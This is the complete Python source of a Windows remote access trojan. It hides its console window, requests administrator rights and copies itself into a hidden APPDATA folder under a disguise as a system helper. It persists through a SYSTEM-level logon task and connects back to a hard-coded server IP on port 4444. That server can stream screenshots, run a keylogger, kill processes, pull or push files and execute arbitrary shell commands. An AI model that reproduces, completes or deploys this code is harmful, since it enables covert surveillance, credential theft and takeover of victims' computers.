import socket
import subprocess
import threading
import os
import sys
import time
import ctypes
import shutil
from PIL import ImageGrab
import io
import keyboard

SERVER_HOST = '152.53.182.180'
SERVER_PORT = 4444
TASK_NAME = "WindowsSystemHelper"

viewing = False
keylogging = False
log_buffer = []

def hide_itself():
    try:
        if getattr(sys, 'frozen', False):
            current = sys.executable
        else:
            current = os.path.abspath(sys.argv[0])
        hidden_dir = os.path.join(os.getenv('APPDATA'), 'WindowsHelper')
        os.makedirs(hidden_dir, exist_ok=True)
        target = os.path.join(hidden_dir, "WindowsSystemHelper.exe")
        if current != target:
            shutil.copy2(current, target)
            ctypes.windll.kernel32.SetFileAttributesW(target, 0x02 | 0x04)
            return target
        return current
    except:
        return None

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def request_admin():
    if is_admin(): return True
    try:
        if getattr(sys, 'frozen', False):
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, None, None, 1)
        else:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{os.path.abspath(sys.argv[0])}"', None, 1)
        sys.exit(0)
    except:
        return False

def create_persistent_task(exe_path):
    if not is_admin(): return False
    try:
        os.system(f'schtasks /delete /tn {TASK_NAME} /f >nul 2>&1')
        cmd = f'schtasks /create /tn {TASK_NAME} /tr "{exe_path}" /sc onlogon /ru SYSTEM /rl HIGHEST /f'
        return os.system(cmd) == 0
    except:
        return False

def hide_console():
    if os.name == 'nt':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def keylogger():
    global keylogging, log_buffer
    def on_key(event):
        if keylogging:
            log_buffer.append(event.name)
    keyboard.on_release(on_key)
    while True: time.sleep(1)

def send_screenshot(client):
    global viewing
    while viewing:
        try:
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format='JPEG', quality=60)
            data = buf.getvalue()
            client.send(len(data).to_bytes(4, 'big') + data)
            time.sleep(0.25)
        except:
            viewing = False
            break

def connect_to_vps():
    global viewing, keylogging
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((SERVER_HOST, SERVER_PORT))

            while True:
                cmd = client.recv(8192).decode('utf-8', errors='ignore').strip()
                if not cmd: continue

                if cmd.lower() == 'exit':
                    client.close()
                    return

                # === CUSTOM COMMANDS ===
                if cmd == 'view':
                    viewing = True
                    threading.Thread(target=send_screenshot, args=(client,), daemon=True).start()
                    client.send(b'[+] Live View Started')

                elif cmd == 'stopview':
                    viewing = False
                    client.send(b'[+] Live View Stopped')

                elif cmd == 'sysinfo':
                    info = f"Username: {os.getenv('USERNAME')}\nAdmin Rights: {is_admin()}\n"
                    client.send(info.encode())

                elif cmd == 'processes':
                    client.send(subprocess.getoutput('tasklist').encode())

                elif cmd.startswith('kill '):
                    pid = cmd.split()[1]
                    client.send(subprocess.getoutput(f'taskkill /F /PID {pid}').encode())

                elif cmd.startswith('keylog'):
                    if 'start' in cmd:
                        keylogging = True
                        if not any(t.name == 'keylogger' for t in threading.enumerate()):
                            threading.Thread(target=keylogger, daemon=True, name='keylogger').start()
                        client.send(b'[+] Keylogger Started')
                    elif 'stop' in cmd:
                        keylogging = False
                        if log_buffer:
                            client.send(('KEYLOG: ' + ' '.join(log_buffer)).encode())
                            log_buffer.clear()
                        else:
                            client.send(b'[+] Keylogger Stopped')

                elif cmd.startswith('download '):
                    path = cmd.split(maxsplit=1)[1]
                    try:
                        with open(path, 'rb') as f:
                            data = f.read()
                        client.send(len(data).to_bytes(8, 'big'))
                        client.send(data)
                    except:
                        client.send(b'FILE_NOT_FOUND')

                elif cmd.startswith('upload '):
                    filename = cmd.split(maxsplit=1)[1]
                    try:
                        size = int.from_bytes(client.recv(8), 'big')
                        with open(filename, 'wb') as f:
                            received = 0
                            while received < size:
                                chunk = client.recv(min(8192, size - received))
                                if not chunk: break
                                f.write(chunk)
                                received += len(chunk)
                        client.send(b'FILE_RECEIVED')
                    except:
                        pass

                else:
                    # Normal shell command
                    output = subprocess.getoutput(cmd)
                    client.send((output or '[+] Command Executed').encode('utf-8', errors='ignore'))

        except:
            time.sleep(5)

if __name__ == "__main__":
    hide_console()
    if not is_admin():
        request_admin()
    protected_path = hide_itself()
    if protected_path:
        create_persistent_task(protected_path)

    threading.Thread(target=connect_to_vps, daemon=True).start()

    while True:
        time.sleep(10)
